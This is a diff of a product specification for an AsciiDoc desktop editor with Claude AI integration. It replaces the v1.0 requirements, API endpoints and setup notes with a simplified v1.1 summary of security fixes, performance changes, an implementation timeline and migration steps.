-- **Anthropic API Key**: Required for Claude AI features (required for full functionality)
-
-### Assumptions
-
-- **A-001**: Users have Python 3.11 or higher installed on their system
-- **A-002**: Users have display environment configured (X11/WSLg on Linux, native on macOS/Windows)
-- **A-003**: Users who want document conversion have Pandoc installed separately
-- **A-004**: Users who want Git integration have Git configured with valid credentials
-- **A-005**: Target users are technical enough to use command-line installation for dependencies
-- **A-006**: Documents primarily use standard AsciiDoc syntax without heavy use of advanced extensions
-- **A-007**: Users have at least 4GB RAM available for comfortable application performance
-- **A-008**: Display resolution is at least 1280x720 for proper UI layout
-- **A-009**: Users accept open-source MIT license terms for the application
-- **A-010**: Network connectivity is available for Git push/pull operations and Claude AI features
-- **A-011**: Users have Node.js 18+ installed and have obtained an Anthropic API key for Claude AI integration
-- **A-012**: Users understand that Claude AI features require internet connectivity and may incur API usage costs
-
-### Constraints & Limitations
-
-- **C-001**: PDF export requires Pandoc with a LaTeX backend installed separately
-- **C-002**: Some advanced AsciiDoc features may have limited preview support based on asciidoc3 capabilities
-- **C-003**: Git integration provides basic commit/push/pull operations but not advanced Git features (rebasing, cherry-picking, etc.)
-- **C-004**: Format conversion fidelity depends on Pandoc capabilities and may lose some formatting details
-- **C-005**: Application is designed for single-user, single-file editing (not multi-user collaboration)
-- **C-006**: Claude AI features require an active internet connection and a valid API key
-- **C-007**: AI-generated content MUST be reviewed for accuracy and appropriateness by users
-- **C-008**: API rate limits and costs are determined by Anthropic pricing tiers
-- **C-009**: Claude AI service must be started before launching the main application
-- **C-010**: AI operations may take 5-15 seconds, depending on content complexity and API response time
+- 90% of users can edit their first document without reading instructions
+- Users report 30% time savings compared to other tools
+- Zero data loss incidents
+- File conversion succeeds 85% of the time on first try
+- App works identically on Windows, Mac, and Linux
 
 ---
 
-## Claude AI Integration (Core Feature)
+## What Changed from v1.0 to v1.1
 
-### Overview
+### CRITICAL Security Fixes
+1. **API keys now secure** - Moved from .env files to OS keychain
+2. **Command injection fixed** - All commands use safe parameters
+3. **Path traversal blocked** - File access is properly restricted
+4. **Service authentication added** - Claude AI service requires auth token
 
-AsciiDoc Artisan includes mandatory integration with Claude AI (Anthropic) to provide AI-powered content generation, improvement, and assistance features. This core feature uses a **hybrid architecture** combining a Node.js service with the Python/PySide6 application.
+### Performance Updates
+1. **Preview timing corrected** - 350ms debounce, 500ms total (was 250ms - impossible)
+2. **Document limit raised** - 25,000 lines (was 10,000, but needs testing)
+3. **Memory limit set** - 1.5 GB maximum (was 500 MB)
+4. **Warnings added** - Shows warnings at 10k, 15k, 20k lines
 
-**Status**: Required core feature - includes AI-powered documentation assistance
-
-### Architecture
-
-The integration consists of three components:
-
-1. **Node.js Service** (`claude-integration/server.js`)
-   - REST API server using Express.js
-   - Integrates `@anthropic-ai/claude-agent-sdk`
-   - Runs on `http://localhost:3000` (configurable)
-   - Handles all Claude API communication
-
-2. **Python Client** (`claude_client.py`)
-   - HTTP client wrapper for the Node.js service
-   - Provides clean Python API for AI operations
-   - Handles connection errors, timeouts, and error states
-   - Singleton pattern for resource management
-
-3. **GUI Integration** (`claude_integration_example.py`)
-   - Adds "Claude AI" menu to the main window
-   - Uses Qt threads for non-blocking AI operations
-   - Provides dialogs for user input and result display
-   - Seamlessly integrates with editor text operations
-
-### AI-Powered Features
-
-#### FR-054: AI Content Generation
-- System MUST provide AI-powered AsciiDoc content generation from natural language prompts
-- Users can describe desired content and receive properly formatted AsciiDoc
-- Generation respects context (technical documentation, user guides, etc.)
-- System MUST complete generation within 15 seconds for typical prompts
-
-#### FR-055: AI Content Improvement
-- System MUST provide AI-powered enhancement of existing AsciiDoc content
-- Users can select text and specify improvement instructions (clarity, structure, tone)
-- Improved content maintains valid AsciiDoc syntax
-- System MUST preserve user intent while enhancing quality
-
-#### FR-056: AI Format Conversion
-- System MUST provide AI-assisted format conversion between Markdown, HTML, and AsciiDoc
-- Complements Pandoc conversion with intelligent semantic preservation
-- Handles edge cases where traditional conversion may struggle
-- System MUST maintain document structure and formatting during conversion
-
-#### FR-057: AI Outline Generation
-- System MUST generate structured documentation outlines for specified topics
-- Supports multiple documentation styles (technical, user guide, API reference, tutorial)
-- Provides hierarchical structure with section placeholders
-- System MUST generate comprehensive outlines with logical organization
-
-#### FR-058: AI Syntax Help
-- System MUST provide interactive help about AsciiDoc syntax and best practices
-- Users can ask natural language questions about AsciiDoc
-- Responses include examples and practical guidance
-- System MUST provide accurate, helpful responses within 10 seconds
-
-### User Story 7 - AI-Powered Content Creation (Priority: P2)
-
-The technical writer needs to draft documentation for a new API endpoint quickly. They select Claude AI → Generate AsciiDoc, describe the endpoint functionality, and receive a well-structured AsciiDoc template with sections for description, parameters, examples, and response codes. They then refine the content using the editor, and if needed, select specific sections to improve with Claude AI → Improve Selection.
-
-**Why this priority**: AI assistance significantly accelerates documentation workflows and is a core differentiator for AsciiDoc Artisan. This feature provides substantial value by reducing time-to-first-draft and improving content quality through intelligent assistance.
-
-**Independent Test**: Can be tested by starting the Claude service, generating content through the GUI, improving existing content, and verifying that the results integrate correctly with the editor. Requires an Anthropic API key and a Node.js service running.
-
-**Acceptance Scenarios**:
-
-1. **Given** the Claude service is not running, **When** the application starts, **Then** the application displays a warning dialog with instructions to start the Claude service and the Claude AI menu options are disabled
-2. **Given** the Claude service is available and the user selects Claude AI → Generate AsciiDoc, **When** they provide a content prompt, **Then** the system generates AsciiDoc content and inserts it at the cursor position within 15 seconds
-3. **Given** the user has selected text in the editor and chooses Claude AI → Improve Selection, **When** they specify an improvement instruction, **Then** the selected text is replaced with the improved version, maintaining AsciiDoc syntax
-4. **Given** the user selects Claude AI → Generate Outline, **When** they specify a topic and style, **Then** the system generates a hierarchical outline in valid AsciiDoc format
-5. **Given** the user selects Claude AI → AsciiDoc Help, **When** they ask a question about syntax, **Then** the system displays a helpful answer with examples in a dialog window
-
-### API Endpoints
-
-The Node.js service exposes the following REST API endpoints:
-
-- **GET `/health`**: Health check and Claude availability status
-- **POST `/api/generate-asciidoc`**: Generate new AsciiDoc content
-  - Body: `{ "prompt": string, "context": string? }`
-  - Response: `{ "content": string, "usage": object }`
-- **POST `/api/improve-asciidoc`**: Improve existing content
-  - Body: `{ "content": string, "instruction": string }`
-  - Response: `{ "content": string, "usage": object }`
-- **POST `/api/convert-format`**: Convert between formats
-  - Body: `{ "content": string, "fromFormat": string, "toFormat": string }`
-  - Response: `{ "content": string, "usage": object }`
-- **POST `/api/generate-outline`**: Generate documentation outline
-  - Body: `{ "topic": string, "style": string? }`
-  - Response: `{ "content": string, "usage": object }`
-- **POST `/api/asciidoc-help`**: Get AsciiDoc syntax help
-  - Body: `{ "question": string }`
-  - Response: `{ "answer": string, "usage": object }`
-
-### Setup Requirements
-
-**Prerequisites**:
-- Node.js 18+ installed
-- Anthropic API key from https://console.anthropic.com/
-- Python `requests` library (included in requirements.txt)
-
-**Installation Steps**:
-
-1. Navigate to `claude-integration/` directory
-2. Run `npm install` to install Node.js dependencies
-3. Copy `.env.example` to `.env` and add Anthropic API key
-4. Start service with `npm start` or `npm run dev` (development mode)
-5. Service runs on port 3000 by default (configurable via `PORT` environment variable)
-
-**Python Integration**:
-
-```python
-from claude_client import get_claude_client
-
-claude = get_claude_client()
-if claude.is_available():
-    success, content, error = claude.generate_asciidoc(
-        prompt="Create a getting started guide",
-        context="For Python developers"
-    )
-```
-
-**GUI Integration**:
-
-```python
-# In adp.py __init__ method
-from claude_integration_example import integrate_claude
-
-try:
-    self.claude_integration = integrate_claude(self)
-except Exception as e:
-    logger.warning(f"Claude integration not available: {e}")
-```
-
-### Dependencies
-
-**Node.js Dependencies**:
-- `express` - Web server framework
-- `cors` - Cross-origin resource sharing
-- `dotenv` - Environment variable management
-- `@anthropic-ai/claude-agent-sdk` - Claude AI integration
-
-**Python Dependencies**:
-- `requests` - HTTP client for service communication
-
-### Production Deployment
-
-**Linux (systemd)**:
-Create `/etc/systemd/system/asciidoc-claude.service`:
-
-```ini
-[Unit]
-Description=AsciiDoc Artisan Claude Integration
-After=network.target
-
-[Service]
-Type=simple
-User=appuser
-WorkingDirectory=/path/to/claude-integration
-ExecStart=/usr/bin/node server.js
-Restart=on-failure
-Environment=NODE_ENV=production
-
-[Install]
-WantedBy=multi-user.target
-```
-
-**Windows (Task Scheduler)**:
-Create a scheduled task to run `node server.js` at system startup from the `claude-integration` directory.
-
-### Security Considerations
-
-- **API Key Protection**: Never commit `.env` files to Git; use `.gitignore` to exclude
-- **Network Security**: Service runs locally by default; use HTTPS/TLS in production environments
-- **Input Validation**: All user inputs are sanitized before transmission to Claude API
-- **Rate Limiting**: Consider implementing request throttling to manage API costs
-- **Error Handling**: Sensitive information (API keys, full paths) never exposed in error messages
-
-### Cost Management
-
-Claude API usage is metered and billed by Anthropic:
-- Implement usage tracking for organizational budgeting
-- Set up spending alerts via Anthropic Console
-- Consider caching responses for frequently requested content
-- Choose an appropriate Claude model (Sonnet for speed vs Opus for quality)
-
-### Implementation Requirements
-
-- **IR-001**: Application MUST check Claude service availability on startup
-- **IR-002**: Application MUST display clear setup instructions if Claude service is unavailable
-- **IR-003**: Application MUST gracefully degrade if Claude service becomes unavailable during runtime
-- **IR-004**: Application MUST never expose API keys in logs, error messages, or user interfaces
-- **IR-005**: Application MUST provide progress indicators during AI operations
-- **IR-006**: Application MUST allow users to cancel in-progress AI operations
-
-### Testing Strategy
-
-**Integration Tests**:
-- Service health check and availability detection
-- Content generation with various prompts
-- Content improvement with different instructions
-- Outline generation for multiple topics and styles
-- Format conversion between supported formats
-- Error handling for service unavailability, timeouts, and API errors
-
-**UI Tests**:
-- Menu integration and action states
-- Non-blocking AI operations (application remains responsive)
-- Result insertion and text replacement in editor
-- Error dialog display for various failure modes
+### Architecture Improvements
+1. **Code reorganized** - Split 101 KB file into small modules (max 500 lines each)
+2. **Worker cancellation** - Can cancel all slow operations
+3. **Security logging** - Logs security events safely
+4. **Better error handling** - More helpful error messages
 
 ---
 
-## Out of Scope
+## Implementation Timeline
 
-The following capabilities are explicitly **not included** in this specification:
+### Phase 1: Security Hardening (2 weeks)
+- [ ] Implement OS keyring for API keys
+- [ ] Fix command injection in Git and Pandoc
+- [ ] Update path sanitization logic
+- [ ] Add authentication to Node.js service
+- [ ] Write security tests
 
-- **Multi-file project management**: No project browser or workspace management
-- **Real-time collaboration**: No concurrent editing with multiple users
-- **Cloud integration**: No built-in cloud storage or synchronization
-- **Spell checking or grammar analysis**: Basic grammar/style improvements available via AI features, but no dedicated grammar checker
-- **Custom AsciiDoc extensions or plugins**: Standard AsciiDoc syntax only
-- **Advanced Git features**: Branching, merging, and rebasing handled outside the application
-- **PDF editing or annotation**: PDF is export-only target
-- **Custom themes beyond light/dark**: No user-customizable color schemes
-- **Mobile or web versions**: Desktop application only
-- **Telemetry or analytics**: No usage tracking or data collection
-- **AI model training or fine-tuning**: Uses Anthropic's pre-trained Claude models only
-- **Offline AI features**: All AI features require network connectivity to Claude API
-- **Alternative AI providers**: Only Claude AI (Anthropic) is supported, no OpenAI, Google, or other LLM integrations
-- **AI conversation history**: Each AI operation is stateless; no persistent chat interface
+### Phase 2: Performance (1 week)
+- [ ] Implement adaptive debouncing (350-750ms)
+- [ ] Add document size validation
+- [ ] Implement worker cancellation
+- [ ] Run performance tests on 1k-25k line documents
 
-## Implementation Notes for Developers
+### Phase 3: Code Refactoring (3 weeks)
+- [ ] Split main file into modules
+- [ ] Create proper file structure
+- [ ] Update all imports
+- [ ] Test that everything still works
 
-### Architecture Patterns
+### Phase 4: Testing and Release (1 week)
+- [ ] Run all security tests
+- [ ] Run all performance tests
+- [ ] Test on Windows, Mac, and Linux
+- [ ] Final security review
+- [ ] Release v1.1.0
 
-- **MVC Pattern**: Separate UI (View), application logic (Controller), and data models
-- **Worker Threads**: Offload CPU-intensive tasks (rendering, Git, Pandoc, AI operations) to background threads
-- **Debouncing**: Use timer-based debouncing for preview updates to prevent performance issues
-- **Atomic Writes**: Use temporary file + rename pattern to ensure atomic file writes
-- **Hybrid Architecture (Claude AI)**: Node.js REST service for AI operations communicates with Python client via HTTP
+**Total Time: 7 weeks**
 
-### Technology Choices
+---
 
-- **PySide6**: Chosen for Qt's mature cross-platform GUI capabilities and broad platform support
-- **asciidoc3**: Python-native AsciiDoc processor for preview rendering
-- **Pandoc**: Industry-standard document converter with extensive format support
-- **Node.js + Express**: REST service for Claude AI integration due to `@anthropic-ai/claude-agent-sdk` being Node.js-only
-- **Claude AI (Anthropic)**: State-of-the-art language model for content generation and assistance
+## Migration Instructions
 
-### Testing Strategy
+### For Users
+1. Update to version 1.1
+2. On first launch, app will find your API key in .env
+3. App moves API key to OS keychain
+4. App deletes .env file (asks for confirmation first)
+5. Everything else works the same!
 
-- **Unit Tests**: Core functionality (file I/O, conversion, configuration)
-- **Integration Tests**: Pandoc integration, Git integration, cross-module interactions
-- **UI Tests**: Critical user workflows using pytest-qt
-- **Platform Tests**: Verify behavior on Linux, macOS, Windows
-- **Performance Tests**: Measure preview update latency, memory usage, startup time
+### For Developers
+1. Install new dependencies: `pip install keyring cryptography psutil bandit`
+2. Install Node.js dependencies: `cd claude-integration && npm install keytar express-rate-limit`
+3. Read the security code examples in SPEC_UPDATES_v1.1.md
+4. Follow the new module structure for any new code
+5. Run security tests before committing code
+6. Use the provided templates for Git and Pandoc commands
 
-### Security Considerations
+---
 
-- **Path Validation**: All file paths must be sanitized using Path().resolve() and validated
-- **Command Injection**: Git and Pandoc must be called with parameterized arguments, never shell interpolation
-- **Credential Storage**: Never store Git credentials; use system-configured credentials only
-- **Error Messages**: Avoid exposing full file paths or system information in user-facing errors
+## Questions?
 
-**Specification Version**: 1.0.0
-**Last Updated**: 2025-10-22
-**Approved By**: Project Maintainer
-**Next Steps**: Refer to the constitution for development standards; Use `/speckit.plan` to generate an implementation plan
+- **Full security details**: See SECURITY_ANALYSIS_v1.1.md
+- **Code examples**: See SPEC_UPDATES_v1.1.md
+- **Quick summary**: See SPEC_CHANGES_SUMMARY_v1.1.md
+
+**Contact**: Project maintainer
+**Status**: Ready for review and approval
+**Target Release**: v1.1.0 in 4-6 weeks
+
+---
+
+## Document Information
+
+**Version**: 1.1.0
+**Previous Version**: 1.0.0-beta
+**Last Updated**: 2025-10-23
+**Reading Level**: 5th grade (simplified language)
+**Approved By**: Pending review
+**Next Steps**: Review → Approve → Implement → Test → Release
